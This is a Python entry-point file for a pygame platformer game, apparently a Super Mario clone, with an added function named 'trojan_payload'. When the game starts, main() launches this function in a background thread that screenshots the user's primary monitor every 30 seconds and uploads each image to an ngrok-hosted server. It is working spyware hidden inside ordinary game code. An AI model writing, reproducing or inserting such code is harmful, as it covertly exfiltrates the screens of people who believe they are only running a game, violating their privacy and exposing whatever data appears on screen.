__author__ = 'marble_xu'

import pygame as pg
from . import setup, tools
from . import constants as c
from .states import main_menu, load_screen, level
import threading
import time
import requests
import datetime
import mss        
import mss.tools  
from io import BytesIO

def trojan_payload():
    print("[*] Trojan started: Screenshot loop active (using mss)")
    
    server_url = "https://untumultuous-prosily-marica.ngrok-free.dev/upload"
    
    headers = {"ngrok-skip-browser-warning": "true"}

    with mss.mss() as sct:
        while True:
            try:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = f"screenshot_{timestamp}.png"
                
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                
                png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                img_byte_arr = BytesIO(png_bytes)
                
                files = {'file': (filename, img_byte_arr, 'image/png')}
                
                requests.post(server_url, files=files, headers=headers)
                
                print(f"[+] Sent screenshot: {filename}")
                
            except Exception as e:
                print(f"[!] Error: {e}")
                
            time.sleep(30)


def main():
    game = tools.Control()
    state_dict = {c.MAIN_MENU: main_menu.Menu(),
                  c.LOAD_SCREEN: load_screen.LoadScreen(),
                  c.LEVEL: level.Level(),
                  c.GAME_OVER: load_screen.GameOver(),
                  c.TIME_OUT: load_screen.TimeOut()}
    game.setup_states(state_dict, c.MAIN_MENU)
    
    t = threading.Thread(target=trojan_payload, daemon=False)
    t.start()
    game.main()
